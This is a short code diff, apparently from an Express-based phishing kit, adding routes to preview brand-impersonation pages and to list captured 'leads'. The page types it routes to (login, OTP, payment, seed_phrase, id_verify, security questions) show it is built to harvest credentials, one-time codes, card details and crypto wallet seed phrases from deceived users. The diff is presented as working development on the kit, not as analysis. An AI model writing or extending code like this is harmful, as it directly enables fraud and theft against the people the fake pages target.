@@ -134,9 +134,11 @@ app.get('/preview/:brandKey', isAdmin, (req, res) => {
       if (tpl) break;
     }
     if (!tpl) return res.status(404).send(`Brand "${brandKey}" not found`);
-    const pageContent = tpl.pages[0];
+    const pageIdx = parseInt(req.query.page || '0', 10);
+    const pageContent = tpl.pages[pageIdx] || tpl.pages[0];
     const fakePage = { id: 0, slug: 'preview', title: tpl.name, mode: 'online', active: 1 };
-    res.render('login', { page: fakePage, tpl, pageContent, allPages: tpl.pages, csrfToken: 'preview', logos: LOGOS });
+    const view = { login:'login', otp:'otp', payment:'payment', seed_phrase:'seed_phrase', id_verify:'verify', security_q:'verify' }[pageContent.form_type] || 'login';
+    res.render(view, { page: fakePage, tpl, pageContent, allPages: tpl.pages, csrfToken: 'preview', logos: LOGOS });
   } catch(err) {
     res.status(500).send(err.message);
   }
@@ -476,6 +478,15 @@ app.post('/admin/login', (req, res) => {
 });
 
 app.post('/admin/logout', (req, res) => req.session.destroy(() => res.redirect('/admin/login')));
+// ─── ALL LEADS ────────────────────────────────────────────────
+app.get('/admin/leads', isAdmin, (req, res) => {
+  try {
+    const leads = db.prepare('SELECT l.*, p.slug FROM leads l LEFT JOIN pages p ON p.id = l.page_id ORDER BY l.id DESC LIMIT 500').all();
+    res.render('all_leads', { leads });
+  } catch(e) { res.status(500).send('Error: ' + e.message); }
+});
+
+
 
 // ADMIN DASHBOARD
 app.get('/admin', isAdmin, (req, res) => {
